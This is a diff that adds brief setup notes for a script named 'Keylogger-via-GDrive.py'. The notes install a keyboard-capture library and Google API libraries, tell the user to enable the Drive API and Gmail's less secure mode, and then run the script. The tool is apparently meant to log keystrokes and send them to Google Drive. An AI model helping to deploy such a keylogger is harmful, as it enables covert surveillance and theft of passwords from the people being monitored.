@@ -1,0 +1,16 @@
+#install python lib
+
+pip3 install keyboard
+
+#install google API lib
+
+pip3 install google-api-python-client google-auth-httplib2 google-auth-oauthlib tabulate requests tqdm
+
+#Enable API Drive
+#Enable Gmail Less Security mode
+
+
+#Run
+
+python3 Keylogger-via-GDrive.py
+
